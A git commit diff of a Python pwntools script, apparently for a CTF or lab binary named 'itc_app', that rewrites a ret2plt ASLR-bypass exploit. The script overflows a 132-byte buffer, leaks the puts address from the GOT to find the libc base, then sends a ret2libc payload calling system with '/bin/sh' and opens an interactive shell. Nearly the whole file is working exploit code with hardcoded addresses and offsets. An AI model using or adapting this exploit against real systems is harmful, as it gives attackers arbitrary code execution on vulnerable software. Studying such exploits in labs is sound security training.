2cc2ff9a616520aa7cb9d23a82453345b9059b3a
Ka1al0gen <kaialogen@protonmail.com>
2024-03-19 22:18:35 +0000

    Update main_prototype.py

--- main_prototype.py
+++ main_prototype.py
@@ -1,50 +1,45 @@
+#Adapted from https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass#final-exploit
+
 from pwn import *
 
-# Set up the binary and context
-binary_path = './itc_app'
-elf = context.binary = ELF(binary_path)
-context.update(arch='i386', os='linux')
+elf = context.binary = ELF('./itc_app')
+proc = process()
 
-# Start the process
-p = process(binary_path)
 
-# Function to leak libc address and calculate libc base
-def leak_libc_address():
-    # Craft the first payload to leak the address of a libc function (puts)
-    payload = flat({
-        132: [
-            elf.plt['puts'],  # Call puts@plt to print out the address of puts@got
-            elf.symbols['main'],  # Return to main after leaking the address
-            elf.got['puts']  # Address of puts in the GOT to leak
-        ]
-    })
+payload = (b'A' * 132 +
+    struct.pack("I", 0x8048340) + # puts PLT
+    struct.pack("I", 0x804847b) + # main address
+    struct.pack("I", 0x80497ac)  # puts GOT
+)
 
-    # Send the payload
-    p.sendlineafter('>', payload)
+proc.sendline(payload)
 
-    # Receive the leaked address
-    leaked_puts = u32(p.recv(4))
-    log.info(f'Leaked puts@GOT address: {hex(leaked_puts)}')
+welcome = False
+for i in range(10):
+    line = proc.recvline()
+    if welcome and b"Welcome" in line:
+        leakedAddr= int.from_bytes(prevLine[:4], byteorder='little')
+        print("\033[32m"+"Leaked puts' libc Addr: "+"\033[0m"+"\033[36m"+hex(leakedAddr)+"\033[0m")
 
-    # Calculate the libc base address
-    libc_base = leaked_puts - libc.symbols['puts']
-    log.info(f'Calculated libc base address: {hex(libc_base)}')
-    return libc_base
+        libc_address = leakedAddr - 0x731b0 # libc puts offset
 
-# Calculate libc base address by leaking an address
-libc_base = leak_libc_address()
+        print("\033[32m"+"Libc base Addr: "+"\033[0m"+"\033[36m"+hex(libc_address)+"\033[0m")
+        break
+    if b"Welcome" in line:
+        welcome = True
+    prevLine = line
+    try:
+        print(line)
+    except EOFError:
+        break
 
-# Craft the second payload to get a shell
-payload = flat({
-    132: [
-        elf.plt['system'],  # system@plt
-        next(elf.search(b'/bin/sh\x00')),  # Return to this address after system
-        libc_base + next(libc.search(b'/bin/sh\x00'))  # "/bin/sh" string found in libc
-    ]
-})
+payload = (
+    b'A' * 132 +
+    struct.pack("I",libc_address+0x4c830) + # libc system offset
+    struct.pack("I",libc_address+0x3c130) + # libc exit offset
+    struct.pack("I",libc_address+0x1b5fc8)  # libc /bin/sh offset
+)
 
-# Send the payload to get a shell
-p.sendlineafter('>', payload)
+proc.sendline(payload)
 
-# Switch to interactive mode
-p.interactive()
+proc.interactive()
